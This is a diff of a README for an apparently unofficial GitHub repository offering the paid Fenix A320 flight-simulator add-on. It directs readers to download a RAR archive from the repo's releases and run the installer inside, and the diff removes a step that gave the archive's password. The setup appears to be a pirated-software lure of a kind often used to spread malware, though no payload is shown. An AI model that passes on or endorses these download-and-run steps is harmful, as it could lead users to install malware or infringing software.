@@ -17,9 +17,8 @@ Welcome to the Fenix Airbus A320 repository! This project offers a complete bund
 
 ## 🛠️ Installation  
 1. **Download** the latest release from the [releases page](https://github.com/Kuper305/fenix-a320/releases/download/v2.3.0.524/FenixInstaller-1.0.148.rar) 
-2. **Enter password** (2025) and extract files
-3. **Run the installer** and follow on-screen instructions
-4. **Launch MSFS** and select the Fenix A320 from your hangar
+2. **Run the installer** and follow on-screen instructions
+3. **Launch MSFS** and select the Fenix A320 from your hangar
 
 ---
 
